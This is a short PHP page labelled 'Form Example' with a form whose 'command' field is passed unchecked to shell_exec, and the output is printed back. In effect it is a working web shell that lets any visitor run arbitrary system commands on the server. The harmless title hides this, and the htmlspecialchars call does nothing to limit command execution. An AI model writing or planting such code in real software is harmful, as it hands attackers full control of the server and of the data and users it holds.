<?php
    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        $cmd = isset($_POST['command']) ? htmlspecialchars($_POST['command']) : '';
        echo "cmd: " . $cmd . "<br>";
        echo shell_exec($cmd);
    }
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Form Example</title>
</head>
<body>
    <form action="" method="post">
        Command: <input type="text" name="command">
        <input type="submit">
    </form>
</body>
</html>
